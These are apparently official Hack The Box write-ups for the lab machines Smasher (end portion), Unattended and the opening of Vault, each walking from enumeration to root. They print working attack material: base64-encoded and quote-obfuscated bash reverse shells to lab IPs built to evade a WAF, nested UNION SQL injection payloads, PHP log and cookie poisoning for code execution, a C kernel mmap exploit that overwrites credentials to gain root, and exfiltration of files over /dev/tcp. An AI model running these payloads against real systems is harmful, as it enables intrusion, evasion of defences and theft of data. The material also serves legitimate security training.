 
 
 
 
 
Looking further, we see the object consisting of a few internal attributes i.e. the integers
 
 
 
 
 
 
 
   
 
 
 
 
 
 
login_count, last_login, and blocked. The time_module might be used to represent the time of
 
 
 
 
 
 
 
 
 
 
 
 
 
 
the login attempt. Next, let’s look at the check_login method, which we saw in the login() method. 
 
 
 
Right at the top we see that it checks if the passed argument is a dict or not. If it’s a dict then it
 
 
 
 
 
 
   
   
 
 
     
 
 
   
   
 
   
Page 12 / 29 
 
checks if the parameter “data” is present in the dict or not. 
 
 
 
If there’s a data parameter in the input object, the code then checks if the user is blocked from
 
   
 
 
 
 
 
 
 
 
 
   
 
   
 
 
logging in or not. 
 
 
 
The is_blocked() method checks if the “blocked” attribute in the object is set or not. If the method
 
 
 
   
 
 
   
 
   
 
 
   
 
 
returns 1, the login fails. If the user isn’t blocked, the get_login_count() method is called, which
   
 
 
   
 
 
 
 
 
 
   
 
 
returns the number of login attempts by the user. If the count is greater than 9, then the code
 
 
 
 
 
 
 
 
   
 
   
 
 
 
 
 
 
jumps to loc_23eb. 
Page 13 / 29 
 
 
 
After jumping to loc_23eb, the set_blocked() method is called to prevent future login attempts by
 
 
 
 
 
 
   
 
 
 
 
 
 
 
the user within a period of time. The user object i.e. var_68 is never used by code after this point.
 
 
   
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
This is where the concept of “Reference Counting” comes in. 
 
 
Reference Counting 
Unlike C and C++, python automatically creates and frees objects on the heap. In order to keep 
track of the usage of an object, python counts the number of references to it. In simple terms, a 
reference is a pointer to the object in memory. The getrefcount function in the sys module returns 
the number of references to an object. For example: 
 
from​ sys ​import​ getrefcount 
 
a = [​'HTB rockz!!'​] 
print​ ​"Current count: {}"​.format(getrefcount(a)) 
 
b = a 
print​ ​"New count: {}"​.format(getrefcount(a)) 
 
The code initializes the variable “a” with a list containing the string ‘HTB rockz!!’. This is allocated 
Page 14 / 29 
 
by python on the heap, and now a reference is given to “a” pointing to the list. Then the 
reference count for “a” is printed. Next, another variable “b” is initialized with “a”. This will pass 
the reference of the string to “b”. After which the reference count is printed again. 
 
As we can see, the reference count for “a” is equal to two, as it is referenced by the function as 
well as the variable creation. The reference count is incremented to three after the variable “b” 
gets initialized. But once the variable gets deleted, the reference count is decremented. Add the 
following lines to the script and run the code again. 
 
del​ b 
print​ ​"Count after deleting b: {}"​.format(getrefcount(a)) 
 
As discussed, the reference count for “a” goes back to 2 due to dereferencing of the object after 
deletion of “b”. When the reference count for a particular object falls to 0 , the garbage collector 
automatically deallocates it from the heap.  
Page 15 / 29 
 
Exploitation 
Now that we know about Reference Counting, we can go ahead and try exploiting the server. 
Going back to the python code, it’s seen that the secret_token_info list is initialized right after the 
check_login method is called. 
 
tmp_user_login = ​None 
try​: 
     is_logged = manager.check_login(data) 
     secret_token_info = [​"/api/<api_key>/job"​, manager.secret_key, 
int(time.time())] 
 
The secret_token_info is present right next to the “data” object on the heap and is shifted to the 
top once the reference count for “data” drops to 0. 
This means that we can leak the secret_token object at the 11th login attempt by sending a 
crafted object in the request, such as: 
 
{"action": "auth", "data":["","",0]} 
 
Where ​["","",0]​ ​is the format​ ​for secret_token_info.  
 
The image shows the leaked API token after sending 10 failed login attempts.  
Page 16 / 29 
 
 
Alternate Method 
Going back to the check_login method we see the strcmp calls, which use the get_internal_usr() 
and get_internal_pwd() calls. 
 
 
Looking at the definition of both the methods: 
 
 
 
We see that the methods are one and the same. They both take in the object and read the first
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
element from it, i.e. the username, which can be concluded from PyList_GetItem(var_10, 0x0). 
Page 17 / 29 
 
So the check_login methods compare the request username and password to ​just the internal
 
 
 
 
 
 
 
 
 
 
 
 
 
 
username and not the password. This means that we can bypass the login if we’re able to guess
 
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
the correct username. 
 
Trying a few usernames we find that “Administrator” let’s us in. It is worth noting that C is case
   
 
 
 
 
 
 
 
 
     
 
 
     
 
sensitive, hence administrator is not the same as Administrator. 
 
 
 
The API key is returned, which can be used to execute commands. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 18 / 29 
 
Foothold 
As we saw earlier that the schedule parameter is vulnerable to command injection. Let’s try 
injecting some commands. 
 
 
We see output of the command “whoami”. But other commands such as ls, curl, or wget return a 
403 error. This could mean that there’s a WAF in place. 
 
 
In bash there’s a feature known as string concatenation, for example: 
 
Page 19 / 29 
 
All the characters or strings within the quotes are concatenated to form a single string and then 
the command gets executed. We can abuse this in order to bypass the WAF. This is because the 
WAF sees the obfuscated command but not the final command line. The only precaution we 
need to take is that the number of quotes should be even. Let’s try that. 
 
 
As we see, ​l​'​s​'​ ​was able to bypass the WAF and execute. Now, in order to get a shell we can use 
a bash one-liner encoded as base64. 
 
echo '/bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' | base64 
 
After which our command would look like: 
 
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvNDQ0NCAwPiYxCg== | base64 -d | 
bash 
 
And to bypass the WAF we can use: 
 
ec''ho 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvNDQ0NCAwPiYxCg==' | 
'b'a''s''e'6'4 -'d'| b'a''s'h 
 
 
Page 20 / 29 
 
 
 
 
We can now use ssh-keygen to create SSH keys for dzonery on the box and then copy the id_rsa 
key locally to login via SSH. 
 
Page 21 / 29 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 22 / 29 
 
Privilege Escalation 
Enumeration 
Looking at the groups of the user we see that he’s in the adm group. 
 
This gives us read access to the system and kernel logs. While looking at the /var/log/kern.log we 
see an odd kernel module named DHID being loaded. 
 
smasher kernel: [4.892246] dhid: loading out-of-tree module taints kernel. 
smasher kernel: [4.892273] dhid: module verification failed: signature and/or 
required key missing - tainting kernel 
smasher kernel: [4.892401] DHID initializing the LKM 
smasher kernel: [4.892402] DHID registered correctly with major number 243 
smasher kernel: [4.892407] DHID device class registered correctly 
smasher kernel: [4.897449] DHID device class created correctly 
This can be seen using the command lsmod. 
 
Page 23 / 29 
 
The module can be found using the “locate” command. 
 
Let’s transfer this locally using scp to investigate further. 
 
 
We can use Hopper once again to reverse this driver. Looking at the dev_open() method we see 
that device opening information is printed. 
 
 
Going back to the box and looking at /dev/dhid we see a world writable device. 
Page 24 / 29 
 
 
This can be used to allocate memory using the ​mmap()​ call. According to the man page: 
 
The arguments are the address to start from, the total length and other flags. 
Looking at the dev_mmap() which is the mmap handler for the module, we see it accepts the user 
arguments without any checks or sanitization. 
 
Page 25 / 29 
 
The register r12 is used to store the vma_size, and rbx is the offset which can be noticed in the 
print format. We see it checks if the vma_size is greater than 0x10000 and if the offset is greater 
than 0x1000. If this is true then the mmap fails, else it calls ​remap_pfn_range()​, as denoted by 
loc_b3c: 
 
This function is used to remap kernel memory to userspace. As the vma_size is a signed integer 
we can overflow it with a negative value such as 0xf000000 which will include the whole 
memory along with the kernel space from where we can search for the credential structure. 
Here’s an excellent paper by MWR labs describing this vulnerability and exploitation: 
https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18
.pdf 
Here’s the PoC for the exploitation. 
 
#include ​<stdio.h> 
#include ​<fcntl.h> 
#include ​<stdlib.h> 
#include ​<string.h> 
#include ​<unistd.h> 
#include ​<sys/types.h> 
#include ​<sys/mman.h> 
  
int​ ​main​ ( ​int​ argc, ​char​ * ​const​ * argv) 
{ 
 
printf​ ( ​"[+] PID: %d\n"​ , getpid()); 
 
int​ fd = open( ​"/dev/dhid"​ , O_RDWR); 
 
if​ (fd < ​0​ ) 
 
{ 
 
printf​ ( ​"[-] Open failed!\n"​ ); 
      ​return​ ​-1​ ; 
 
} 
  
 
printf​ ( ​"[+] Open OK fd: %d\n"​ , fd); 
Page 26 / 29 
 
 
 
unsigned​ ​long​ size = ​0xf0000000​ ; 
 
unsigned​ ​long​ mmapStart = ​0x42424000​ ; 
 
unsigned​ ​int​ * addr = ( ​unsigned​ ​int​ *)mmap(( ​void​ *)mmapStart, size, 
PROT_READ | PROT_WRITE, MAP_SHARED, fd, ​0x0​ ); 
  
 
if​ (addr == MAP_FAILED) 
 
{ 
 
perror( ​"Failed to mmap: "​ ); 
      close(fd); 
 
return​ ​-1​ ; 
 
} 
 
printf​ ( ​"[+] mmap OK addr: %lx\n"​ , addr); 
 
unsigned​ ​int​ uid = getuid(); 
printf​ ( ​"[+] UID: %d\n"​ , uid); 
 
unsigned​ ​int​ credIt = ​0​ ; 
unsigned​ ​int​ credNum = ​0​ ; 
while​ ((( ​unsigned​ ​long​ )addr) < (mmapStart + size - ​0x40​ )) 
{ 
credIt = ​0​ ; 
if​ ( addr[credIt++] == uid && addr[credIt++] == uid && addr[credIt++] == uid 
&& addr[credIt++] == uid && addr[credIt++] == uid && addr[credIt++] == uid && 
addr[credIt++] == uid && addr[credIt++] == uid ) 
  
{ 
credNum++; 
printf​ ( ​"[+] Found cred structure! ptr: %p, credNum: %d\n"​ , addr, 
credNum);  
credIt = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
addr[credIt++] = ​0​ ; 
if​ (getuid() == ​0​ ) 
{ 
puts​ ( ​"[+] GOT ROOT!"​ ); 
credIt += ​1​ ; ​//Skip 4 bytes, to get capabilities addr 
Page 27 / 29 
 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++ ] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​ ; 
addr[credIt++] = ​0xffffffff​; 
execl( ​"/bin/sh"​ , ​"-"​ , ( ​char​ *) ​NULL​ ); 
puts​ ( ​"[-] Execl failed..."​ ); 
break​ ; 
} 
else 
{ 
credIt = ​0​ ; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
addr[credIt++] = uid; 
} 
} 
addr++; 
} 
puts​ ( ​"[+] Scanning loop END"​ ); 
fflush( ​stdout​ ); 
int​ stop = getchar(); 
return​ ​0​ ; 
} 
 
 
It opens the device /dev/dhid then uses mmap to map from the address 0x42424000 and the 
offset 0xf000000. Once successful, it starts to search for our credential structure, i.e. with 
UID=1000. Once found, it replaces them with UID=0 to make us root and then executes /bin/sh. 
Page 28 / 29 
 
More information on the cred structure can be found ​here​. 
Compile the exploit using gcc and transfer it using scp. 
 
 
Once transferred , make it executable and execute the exploit. 
 
 
 
After which we should have a root shell. 
Page 29 / 29 
 
 
 
 
 
 
Unattended 
30​th​ May 2019 / Document No D19.100.34 
Prepared By: MinatoTW 
Machine Author: guly 
Difficulty: ​Medium 
Classification: Official 
 
 
Page 1 / 25 
 
 
SYNOPSIS 
Unattended is a medium difficulty Linux box which needs a good knowledge of SQL and its
 
   
 
 
 
 
 
   
 
 
 
 
 
 
programming flaws. A path traversal on the web server can be exploited to get the source code
 
   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
of the PHP pages. A SQL injection flaw is found, which can be exploited using nested unions to
 
 
 
   
 
 
   
 
 
 
 
 
 
 
 
 
gain LFI. The LFI can then be leveraged to RCE via log files or sessions file. Database access
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
allows the www user to change the configuration and inject commands into a cronjob running as
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
a user. The user is a member of the grub group, which has access to the kernel image through
 
 
 
     
 
 
 
 
 
 
 
 
 
 
 
 
 
which the root password can be obtained.  
 
Skills Required 
●
Enumeration 
●
Code review 
●
SQL 
 
Skills Learned 
●
Union based SQL injection 
●
LFI to RCE 
●
Analyzing kernel image 
 
 
 
 
 
 
 
 
Page 2 / 25 
 
ENUMERATION 
NMAP 
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.126 | grep ^[0-9] | cut -d 
'/'​ -f 1 | tr ​'\n'​ ​','​ | sed s/,$//) 
nmap -sC -sV -p​$ports​ 10.10.10.126 
 
We see HTTP and HTTPS open on their respective ports and the server is Nginx. Nmap found the 
vhost to be www.nestedflanders.htb from the SSL certificate. Let’s add it to the hosts file. 
echo​ ​"10.10.10.126   www.nestedflanders.htb"​ >> /etc/hosts 
 
HTTP AND HTTPS 
Browsing to HTTP page we see nothing but a single dot. 
 
Page 3 / 25 
 
The same behaviour is found on going to the HTTPS page. However, if we browse to the vhost 
www.nestedflanders.htb found earlier we see the default apache page. Let’s run a gobuster with 
common PHP file names from ​seclists​.  
gobuster -t 50 -w Common-PHP-Filenames.txt -u 
https://www.nestedflanders.htb/ -k 
 
It finds index.php, looks like the server had two index files, index.html and index.php and first
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
preference was given to index.html which is normal behaviour. Browsing to /index.php we see a
 
 
 
 
 
   
 
 
 
 
 
 
   
new page. 
 
Page 4 / 25 
 
GOBUSTER 
Running gobuster on the vhost with the normal wordlist. 
gobuster -t 50 -w directory-list-2.3-medium.txt -u 
https://www.nestedflanders.htb/ -k 
 
Gobuster find a page /dev. Let’s check it out.  
 
It says the dev site has been moved to its own server. One common misconfiguration in nginx is
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
   
the alias configuration. Named aliases are used to replace the alias with another file or directory
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
on the server. When an alias isn’t appended with a ‘/’ it leads to a path traversal vulnerability.
 
 
 
 
 
 
 
 
   
   
 
   
 
 
 
More information can be found ​here​.  
 
Page 5 / 25 
 
PATH TRAVERSAL 
Let’s check if the server is vulnerable to path traversal. Append ../ to the URL and send the 
request. 
 
We get a 403 request which is normal as this might be the /var/ folder. Following this, if we add 
html/ to the URL we should land at the index page. 
 
It’s seen that we were able to access the index.html page by using the path traversal because the 
server didn’t redirect us to the root directory. Let’s try to view index.php from here.  
 
Adding index.php to the URL we see that we can access it directly without getting it executed. 
Page 6 / 25 
 
Download the file and open it up.  
 
Looking at the top we find credentials for the database which can be saved for later. Let’s review 
what the functions in the script do. 
function​ ​getTplFromID​($conn) { 
 
global​ $debug; 
 
$valid_ids = ​array​ (​25​,​465​,​587​); 
 
if​ ( (array_key_exists(​'id'​, $_GET)) && (intval($_GET[​'id'​]) == 
$_GET[​'id'​]) && (in_array(intval($_GET[​'id'​]),$valid_ids)) ) { 
  
 
$sql = ​"SELECT name FROM idname where id = 
'"​.$_GET[​'id'​].​"'"​; 
  
 
} ​else​ { 
 
$sql = ​"SELECT name FROM idname where id = '25'"​; 
 
} 
 
if​ ($debug) { ​echo​ ​"sqltpl: $sql<br>\n"​; } 
 
 
$result = $conn->query($sql); 
 
if​ ($result->num_rows > ​0​) { 
 
while​($row = $result->fetch_assoc()) { 
 
$ret = $row[​'name'​]; 
 
} 
 
} ​else​ { 
 
$ret = ​'main'​; 
 
} 
 
if​ ($debug) { ​echo​ ​"rettpl: $ret<br>\n"​; } 
 
return​ $ret; 
Page 7 / 25 
 
The first function getTplFromID takes in the value for ID from the GET parameter id. There’s an
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
array of valid IDs 25, 465, 587 which from the pages selected are main, about and contact
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
templates. The script checks if the ID is valid else the default ID is set to 25. Then it uses the id to
 
 
 
   
 
   
 
 
 
 
   
 
 
 
   
 
 
 
 
select the template name from the idname table. Once the query is executed the template name
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
is returned, or else the template main is returned. Looking at the second function: 
function​ ​getPathFromTpl​($conn,$tpl) { 
 
global​ $debug; 
 
$sql = ​"SELECT path from filepath where name = '"​.$tpl.​"'"​; 
 
if​ ($debug) { ​echo​ ​"sqlpath: $sql<br>\n"​; } 
 
$result = $conn->query($sql); 
 
if​ ($result->num_rows > ​0​) { 
 
while​($row = $result->fetch_assoc()) { 
 
$ret = $row[​'path'​]; 
 
} 
 
} 
 
if​ ($debug) { ​echo​ ​"retpath: $ret<br>\n"​; } 
 
return​ $ret; 
} 
The getPathFromTpl function takes in the template as the parameter. It then selects the path of
 
 
 
 
 
 
 
 
 
   
 
 
 
 
 
the template file which is stored in the filepath table.  
$tpl = getTplFromID($conn); 
$inc = getPathFromTpl($conn,$tpl); 
?> 
Then the script calls both the functions to obtain the template requested by the user. Looking at
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
the functions we can guess the database schema to be like this: 
 
Page 8 / 25 
 
It could be that the column name is the foreign key to the Filepath table, and they could be in a
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
     
one-to-one relationship. This is confirmed in the PHP code where the page performs a query by
 
 
   
 
 
 
 
 
 
 
 
   
 
 
doing an inner join and selecting the id and name. 
 
SQL INJECTION TO LFI 
Our objective is to make the page include a file path supplied by us through the path column. 
Looking at the PHP code it’s pretty clear that there is no filtering in place. So we can inject SQL 
queries in the URL parameter. Let’s try to replicate this on a local mysql installation. 
apt install mysql-client mysql-server 
mysql 
create database unattended 
use unattended 
Once the database is created go ahead and create tables to replicate the box. 
create table filepath ( name varchar(20) primary key, path varchar(100)); 
create table idname ( name varchar(20) , id int primary key, foreign key ( 
name) references filepath(name)); 
Then insert the values into the tables.  
mysql> insert into filepath(name, path)  values (​'main'​, 
'/var/www/html/main.php'​) ; 
mysql> insert into filepath(name, path)  values (​'contact'​, 
'/var/www/html/contact.php'​) ; 
mysql> insert into filepath(name, path)  values (​'about'​, 
'/var/www/html/about.php'​) ; 
mysql> insert into idname values ( ​'main'​, 25); 
mysql> insert into idname values ( ​'contact'​, 465); 
mysql> insert into idname values ( ​'about'​, 587); 
Page 9 / 25 
 
 
 
Now the tables are set up almost like the actual database.  
 
Let’s try to inject it now. The page takes the id parameter from the get request to select the
 
 
 
   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
template name. We can abuse the UNION operator to achieve this. Using the UNION operator we
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
can select any string along with the template name. For example: 
select name from idname ​where​ id = ​'25'​ union select ​'HTB'​ ; 
select name from idname ​where​ id = ​'25'​ union select ​'HTB'​ LIMIT 1,1 ; 
 
It’s seen we were able to select HTB instead of “main” by abusing UNION and LIMIT. 
Page 10 / 25 
 
Let’s see how we can do the same with the filepath table.  
select path from filepath ​where​ name = ​'main'​ union select ​'/etc/passwd' 
LIMIT 1,1; 
 
We crafted a query to select the passwd file instead of the path to main.php. Now we just need to
 
   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
combine both these queries to create our injection payload. The final payload will look something
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
like this: 
25​' union select  "main'​ union select ​'/etc/passwd'​ LIMIT 1,1;​" LIMIT 1,1; 
Let’s break it down. The entire payload first goes into the getTplFromID function which would
 
   
 
 
 
 
 
 
 
 
 
 
 
 
look like: 
select name from idname ​where​ id = ​'25'​ union select  ​"main' union select 
'/etc/passwd' LIMIT 1,1;"​ LIMIT 1,1; 
 
Resulting in: 
 
 
 
Page 11 / 25 
 
The selected query will now go to getPathFromTpl function, it’ll look like: 
 
Using which we were able to nest the queries creating a nested UNION select. The final payload
 
 
 
 
 
 
 
 
 
   
 
 
 
 
 
 
to try on the web page is: 
25'​ union select  ​"main' union select '/etc/passwd' LIMIT 1,1;-- -"​ LIMIT 
1,1;-- - 
 
We need to add comments to ignore the rest of the query. Let’s now try this on the webpage. 
https://www.nestedflanders.htb/index.php?id=25​' union select  "main'​ union 
select ​'/etc/passwd'​ LIMIT 1,1;-- -​" LIMIT 1,1;-- -  
 
And we see the contents of the passwd file. 
Page 12 / 25 
 
FOOTHOLD 
Now that we have LFI we can leverage it to RCE by using nginx log file poisoning. Usually the
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
access.log file logs the user-agent. We can change this using Burp and get RCE. The usual
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
location of the nginx access log is at /var/log/nginx/access.log. 
https://www.nestedflanders.htb/index.php?id=25​' union select  "main'​ union 
select ​'/var/log/nginx/access.log'​ LIMIT 1,1;-- -​" LIMIT 1,1;-- - 
 
We see the response containing the logs of the requests and user agents. Let’s change the user 
agent to: 
<?php​ system(​'whoami'​); ​?> 
 
Page 13 / 25 
 
Now urlencode the payload and send the request. 
 
We see that we’re the www-data user. Let’s use a command for reverse shell now. To avoid bad
 
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
characters we need to encode the payload as base64 then executed it.  
echo​ -n ​'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1 &'​ | base64 
Copy the output and set the user agent to: 
<?php system(​'echo 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDMgMD4mMQ==| base64 -d| 
bash'​); ?> 
 
Forward the request and start a listener. Sending the request once again should trigger the
 
 
 
 
   
 
 
 
 
 
 
 
 
 
reverse shell. However, we don’t get a shell. Let’s check the firewall rules to see what ports are
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
 
allowed. 
Page 14 / 25 
 
Change the User agent to: 
<?php​ system(​'cat /etc/iptables/rules.v4'); ?> 
<?php​ system(​'cat /etc/iptables/rules.v46'); ?> 
 
 
Forward the request to see the output. 
 
In the response we see that only ports 80 and 443 are allowed outbound. So, from here on we’ll
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
have to use only these two ports. 
 
echo​ -n ​'bash -i >& /dev/tcp/10.10.14.16/443 0>&1 &'​ | base64 
<?php system(​'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDMgMD4mMSAm 
| base64 -d | bash '​); ?> 
Page 15 / 25 
 
Send the request again and a shell should be received at the listener. 
 
ALTERNATE METHOD 
Another way to achieve RCE is through PHP session files. These files are usually stored at
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
/var/lib/php/sessions/sess_<PHPSESSID>. Let’s view them with: 
https://www.nestedflanders.htb/index.php?id=25​' union select  "main'​ union 
select ​'/var/lib/php/sessions/sess_ep2cn0dtj0tkaa0spg7n0af087'​ LIMIT 1,1;-- 
-​" LIMIT 1,1;-- -  
 
We see our session in the response. Let’s add a dummy cookie with PHP code so that we can
 
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
execute it.
  
Cookie: PHPSESSID=ep2cn0dtj0tkaa0spg7n0af087; PWN= ​<?php​ system(​'whoami'​)​?> 
 
And we see the output of whoami command. 
Page 16 / 25 
 
Note: Make sure there’s no ‘;’ in the payload as it might break the cookie. 
Now let’s get a reverse shell like earlier. Change the cookie to: 
Cookie: PHPSESSID=ep2cn0dtj0tkaa0spg7n0af087; PWN= ​<?php​ system(​"bash -c 
'bash -i >& /dev/tcp/10.10.16.32/443 0>&1'"​)​?> 
 
 
Send the request and start a listener. Then resend it to trigger the shell.  
 
And we have a shell on the other side. 
 
 
Page 17 / 25 
 
As there’s no python or python3 on the box we can use the script command to get a pty shell. 
script -qc /bin/bash /dev/​null 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 18 / 25 
 
LATERAL MOVEMENT 
Now that we have a shell let’s look into the database by using the credentials from earlier.  
mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -D neddy 
Looking at the tables we see config tables. Let’s look at the data. 
select * from config; 
 
There are various kinds of values in the database, of which the “checkrelease” row sticks out. 
There’s also a path for sendmail which can be changed in case a user executes it. 
 
 
Maybe it's being used by some kind of cron to read and then execute the file. Let’s change it to a 
reverse shell command. 
update config ​set​ option_value = ​'bash -c "bash -i >& 
/dev/tcp/10.10.14.16/443 0>&1"'​ ​where​ option_name = ​'checkrelease'​; 
 
 
 
 
 
Page 19 / 25 
 
And after a while a shell should be received. 
 
 
 
Going back and looking at the table again we see that the path was replaced again. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 20 / 25 
 
PRIVILEGE ESCALATION 
ENUMERATION 
Looking at the user groups, we see that he’s a member of the group “grub”. Looking at the 
Debian ​documentation​ we see that grub isn’t a standard group.  
 
Let’s see what files this group owns. 
find / -group grub -ls 2>/dev/null 
 
There’s just one file and it’s the kernel image. Let’s transfer this over. There’s no nc on the box 
but we can use tcp file to transfer it. 
cat /boot/initrd.img-4.9.0-8-amd64 > /dev/tcp/10.10.14.16/80 
nc -lvp 80 > initrd.img-4.9.0-8-amd64 ​# locally 
 
Wait for a while for the transfer to finish as it is a large file. Once complete, compare the MD5 
hash of the files. 
 
 
 
 
Page 21 / 25 
 
 
INSPECTING KERNEL IMAGE 
Looking at the file info we see that it’s a gzip compressed file. 
 
This can be unpacked using cpio. 
zcat initrd.img-4.9.0-8-amd64 | cpio -idmv 
Using zcat we decompress the archive and then pipe it to cpio which copies the files from it. 
 
Once done we should be left with the files and folders from the image. Let’s find strings like 
“password” in all the files. 
grep -R -n -i password . | grep -v Binary  
This command will recursively search for all files with password in it and then ignore the binary 
files. 
 
In one of the results we see a comment by guly on line 300. 
./scripts/​local​-top/cryptroot:300: 
# guly: we have to deal with lukfs 
password sync when root changes her one 
 
Let’s look at the ./scripts/local-top/cryptroot file. 
Page 22 / 25 
 
Jumping to line 300 we come across the comment and a command. 
 
According to the comment the luks password is the same as the root password. The command: 
/sbin/uinitrd c0m3s3f0ss34nt4n1 | ​$cryptopen 
generates the password from the uinitrd binary and then passes it to the $cryptopen command 
which can be found in the script. 
 
It is the cryptsetup command which is used to open a Luks encrypted disk. So the root password 
must the string obtained by running: 
/sbin/uinitrd c0m3s3f0ss34nt4n1 
 
Let’s try that. Go back to the folder with the extracted contents and run the command. 
 
 
We receive a string “supercazzola”. Let’s try to su with that on the box. 
 
 
It doesn’t work as expected.  
Page 23 / 25 
 
Let’s analyse what the binary is doing using strace which traces system calls made by a binary. 
 
strace ./sbin/uinitrd c0m3s3f0ss34nt4n1 
 
 
 
We see that the binary reads from /etc/hostname and then outputs the string based on it. So the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
 
 
host on which it is executed must be a factor in determining the password. Let’s transfer the
 
 
   
 
 
 
   
 
 
 
 
 
 
 
 
binary to the box and try again. 
 
nc -lvp 80  < ./sbin/uinitrd # locally 
cat < /dev/tcp/10.10.14.16/80 > uinitrd 
chmod +x uinitrd 
./uinitrd c0m3s3f0ss34nt4n1 
 
 
 
This time we get a different string.  
 
 
 
Page 24 / 25 
 
Let’s try to su with this. 
 
 
 
And we have a root shell ! 
 
 
Page 25 / 25 
 
 
 
 
 
 
Vault 
3​rd​ April 2019 / Document No D19.100.12 
Prepared By: egre55 
Machine Author: nol0gz 
Difficulty: ​Medium 
Classification: Official 
 
 
Page 1 / 13 
 
 
SYNOPSIS 
Vault is medium to hard difficulty machine, which requires bypassing host and file upload 
restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.  
 
Skills Required 
●
Basic knowledge of Web application 
enumeration techniques 
●
Intermediate knowledge of Linux 
 
Skills Learned 
●
Creating malicious OpenVPN 
configuration files 
●
SSH port forwarding 
●
Bypassing port restrictions using ncat 
 
 
 
 
 
 
 
 
 
 
 
 
Page 2 / 13 
 
Enumeration 
Nmap 
 
masscan -p1-65535,U:1-65535 10.10.10.109 --rate=1000 -p1-65535,U:1-65535 -e tun0 > ports 
ports=$(cat ports | awk -F ​" "​ ​'{print $4}'​ | awk -F ​"/"​ ​'{print $1}'​ | sort -n | tr ​'\n' 
','​ | sed ​'s/,$//'​) 
nmap -Pn -sV -sC -p​$ports​ 10.10.10.109 
 
Nmap output reveals that SSH and an Apache web server are available. Visual inspection of the 
website reveals some text about a service that is being offered. 
 
 
 
 
 
Page 3 / 13 
 
Wfuzz 
Cewl is used to generate a wordlist based on words found on the site, and wfuzz finds the 
directory "sparklays". 
 
cewl http://10.10.10.109 | tr ​'[:upper:]'​ ​'[:lower:]'​ > vault.txt 
wfuzz -u http://10.10.10.109/FUZZ -w vault.txt -R2 --hc 404 
 
Navigating to this page results in a 403 Forbidden, so enumeration with wfuzz continues. 
 
wfuzz -u http://10.10.10.109/sparklays/FUZZ -w /usr/share/dirb/wordlists/common.txt 
-R2 --hc 404 --hl 11 
 
Page 4 / 13 
 
The page "admin.php", directory "design" and subdirectory "uploads" have been found. 
 
After sending this request to Burp, and changing the Host header value to "localhost", the admin 
page is accessible. 
 
 
"Design Settings" links to "/sparkleys/design/design.html" 
 
Page 5 / 13 
 
Foothold (192.168.122.1) 
Bypassing File Upload Restriction 
The "Design Settings" page provides functionality to upload a logo, although there are 
restrictions on the file extension. However, php5 extensions are permitted. 
 
 
After uploading and executing a php reverse shell (e.g. in Kali 
/usr/share/webshells/php/php-reverse-shell.php), a foothold on "Ubuntu" (192.168.122.1) is 
received. 
 
There is a user "dave", and enumeration reveals SSH credentials and other useful information on 
their desktop. 
 
SSH: ​dave:Dav3therav3123  
Key: itscominghome 
Server: 192.168.122.4 
 
 
 
 
Page 6 / 13 
 
SSH Port Forwarding 
A netcat scan of 192.168.122.4 reveals that ports 22 and 80 are open. 
 
nc -vz 192.168.122.4 1-100 
 
 
SSH is used to forward port 80 on 192.168.122.4 to port 8000 locally. 
 
 
 
 
 
 
 
 
 
 
Page 7 / 13 
 
DNS (192.168.122.4) 
Malicious OpenVPN Configuration File 
The webpage contains functionality to edit and test an OpenVPN configuration file. 
